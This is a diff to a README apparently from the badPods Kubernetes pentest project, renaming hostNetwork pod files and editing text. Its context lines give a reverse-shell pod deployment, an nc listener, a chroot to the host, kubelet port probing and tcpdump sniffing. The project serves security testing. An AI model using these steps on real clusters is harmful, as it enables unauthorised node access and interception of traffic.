@@ -25,21 +25,21 @@ spec:
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
   ```
-[pod-hostnetwork-only.yaml](pod-hostnetwork-only.yaml)
+[pod-hostnetwork.yaml](pod-hostnetwork.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostnetwork-only.yaml   
+kubectl apply -f pod-hostnetwork.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork-only/pod-hostnetwork-only.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork/pod-hostnetwork.yaml  
 ```
 
 ### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
+kubectl -n [namespace] exec -it pod-hostnetwork -- bash
 ```
 
 ## Or, create a reverse shell pod
@@ -60,7 +60,7 @@ spec:
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
 ```
-[pod-hostnetwork-only-revshell.yaml](pod-hostnetwork-only-revshell.yaml)
+[pod-hostnetwork-revshell.yaml](pod-hostnetwork-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -71,7 +71,7 @@ nc -nvlp 3116
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
+envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
@@ -91,7 +91,7 @@ apt update && apt install tcpdump
 ```
 You now have a few options for next steps: 
 
-See if the `kubelet` read-only port (10255/tcp) is open on any of the node's IPs
+See if the `kubelet` read port (10255/tcp) is open on any of the node's IPs
 ```bash
 nc -zv 10.0.0.162 10255
 Connection to 10.0.0.162 10255 port [tcp/*] succeeded!
@@ -99,7 +99,7 @@ nc -zv 172.17.0.1 10255
 Connection to 172.17.0.1 10255 port [tcp/*] succeeded!
 ```
 
-If the read-only port is open, run `tcpdump`, recording the output to a file for a few minutes.
+If the read port is open, run `tcpdump`, recording the output to a file for a few minutes.
 
 **Warning:** Sniffing on an interface with a lot of traffic can cause the interface to DROP traffic, which is not what you want in an production environment. I suggest picking one port at a time for your packet captures (e.g., 10255, 80, 8080, 3000 25, 23)
 **Warning:** Always run `tcpdump` with the `-n` flag. This turns off name resolution, and if you don't, the name resolution will bring the capture, and potentially the host, to its knees. 
